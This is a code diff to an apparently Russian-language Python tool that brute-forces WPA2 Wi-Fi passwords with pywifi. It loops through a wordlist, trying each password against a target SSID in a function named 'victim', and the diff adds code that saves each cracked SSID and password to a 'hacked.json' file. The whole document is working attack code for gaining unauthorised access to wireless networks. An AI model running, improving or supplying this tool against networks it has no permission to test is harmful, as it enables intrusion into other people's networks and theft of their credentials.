@@ -1,3 +1,4 @@
+import json
 from pywifi import Profile, const
 from libs.TFormat import tcolors
 from libs.func import clear
@@ -11,8 +12,8 @@ def victim (iface, ssid, password): # Сетевой профиль
     profile.akm.append(const.AKM_TYPE_WPA2PSK)
     profile.cipher = const.CIPHER_TYPE_CCMP
     profile.key = password
-
     iface.remove_all_network_profiles()
+
     profile = iface.add_network_profile(profile)
     iface.connect(profile)
     sleep(0.1)
@@ -25,7 +26,7 @@ def victim (iface, ssid, password): # Сетевой профиль
 def brutforce(iface, ssid):
     clear()
     print(tcolors.PROC)
-    passwords = open('words.txt', 'r')
+    passwords = open('files\\words.txt', 'r')
     l = len(passwords.readlines())
     passwords.seek(0)
     count = 0
@@ -39,11 +40,20 @@ def brutforce(iface, ssid):
                 sleep(0.2)
                 clear()
                 print(tcolors.SUCCESS +\
-                      f"[+] Успешное подключение!\nПароль: {pwd.rstrip()}" + tcolors.END)
-                exit()
+                      f"[+] Успешное подключение!\nПароль: {pwd.rstrip()}\
+                      \n\n[+] Данные записаны в files\hacked.json" + tcolors.END)
+                with open('files\\hacked.json', 'a') as hacked:
+                    write = {
+                        'ssid' : ssid,
+                        'pwd' : pwd.rstrip()
+                    }
+                    json.dump(write, hacked)
+                    hacked.write('\n')
+                hacked.close()
+                return 1
             else:
                 bar.update(1)
                 count += 1
-    passwords.close()
+
     clear()
     print(tcolors.ERROR + "[-] Не удалось подобрать пароль :(" + tcolors.END)
